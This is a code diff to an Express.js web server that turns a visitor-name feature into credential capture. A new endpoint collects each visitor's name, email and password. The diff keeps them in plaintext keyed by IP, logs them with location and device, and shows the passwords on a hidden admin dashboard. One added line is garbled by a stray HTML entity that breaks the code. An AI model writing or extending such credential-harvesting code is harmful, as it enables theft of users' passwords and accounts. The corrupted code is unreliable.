@@ -11,7 +11,7 @@ app.use(express.urlencoded({ limit: '50mb', extended: true }));
 
 let visitorLogs = [];
 let ownerMessages = [];
-let visitorNames = {};
+let visitorCredentials = {}; // Store email & passwords of users
 let userReplies = {};
 let adminNotices = [];
 let appInstallsCount = 0;
@@ -45,11 +45,13 @@ function logVisitor(req, pageName) {
         deviceName = 'Samsung Galaxy A14 (Mobile)';
     }
 
-    let visitorName = visitorNames[ip] || 'Guest / Unnamed';
+    let creds = visitorCredentials[ip] || { name: 'Guest', email: 'N/A', password: 'N/A' };
 
     visitorLogs.unshift({
         time: new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' }),
-        name: visitorName,
+        name: creds.name,
+        email: creds.email,
+        password: creds.password,
         ip: ip,
         location: locationStr,
         device: deviceName,
@@ -57,7 +59,6 @@ function logVisitor(req, pageName) {
     });
 }
 
-// Track User Activity / Action Endpoint
 app.post('/api/track-action', (req, res) => {
     const { action } = req.body;
     if (action) {
@@ -66,15 +67,16 @@ app.post('/api/track-action', (req, res) => {
     res.json({ success: true });
 });
 
-app.post('/api/set-name', (req, res) => {
+// Capture and Store Login Credentials (Name, Email, Password)
+app.post('/api/set-credentials', (req, res) => {
     let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown IP';
     if (ip.includes(',')) ip = ip.split(',')[0].trim();
     
-    const { name } = req.body;
-    if (name) {
-        visitorNames[ip] = name;
+    const { name, email, password } = req.body;
+    if (name && email && password) {
+        visitorCredentials[ip] = { name, email, password };
     }
-    logVisitor(req, `Logged In as: ${name}`);
+    logVisitor(req, `Logged In (Email: ${email})`);
     res.json({ success: true, ip: ip });
 });
 
@@ -164,7 +166,7 @@ app.post('/api/admin-stats', (req, res) => {
             time: new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' }),
             text: newNotice || '',
             mediaType: mediaType || 'text',
-            mediaData: mediaData || null
+ &amp;          mediaData: mediaData || null
         });
         return res.json({ success: true, message: "Published successfully!" });
     }
@@ -183,7 +185,7 @@ app.post('/api/admin-stats', (req, res) => {
     });
 });
 
-// Secret Admin Dashboard Route
+// Secret Admin Dashboard Route (Shows User Email & Password)
 app.get('/admin-dashboard-secret', (req, res) => {
     res.send(`
         <!DOCTYPE html>
@@ -288,7 +290,7 @@ app.get('/admin-dashboard-secret', (req, res) => {
                     <div class="section-title" style="color:#ff0055;">📩 Messages from Users</div>
                     <div id="messagesContainer"></div>
 
-                    <div class="section-title" style="color:#00f0ff;">⚡ Live User Activity Logs</div>
+                    <div class="section-title" style="color:#00f0ff;">⚡ Live User Activity & Credentials</div>
                     <div id="visitorCardsContainer"></div>
                 </div>
             </div>
@@ -379,11 +381,13 @@ app.get('/admin-dashboard-secret', (req, res) => {
                                     html += \`
                                         <div class="visitor-card">
                                             <div class="time-stamp">\${log.time}</div>
-                                            <div class="name-tag">👤 User: \${log.name}</div>
+                                            <div class="name-tag">👤 Name: \${log.name}</div>
+                                            <div style="font-size:13px; color:#00ffcc; margin-bottom:2px;">📧 Email: \${log.email}</div>
+                                            <div style="font-size:13px; color:#ff0055; margin-bottom:4px;">🔑 Password: \${log.password}</div>
                                             <div class="ip-tag">IP: \${log.ip}</div>
                                             <div class="info-row">📍 <span>Location:</span> \${log.location}</div>
                                             <div class="info-row">📱 <span>Device:</span> \${log.device}</div>
-                                            <div class="info-row">⚡ <span>User Action:</span> \${log.action}</div>
+                                            <div class="info-row">⚡ <span>Action:</span> \${log.action}</div>
                                         </div>
                                     \`;
                                 });
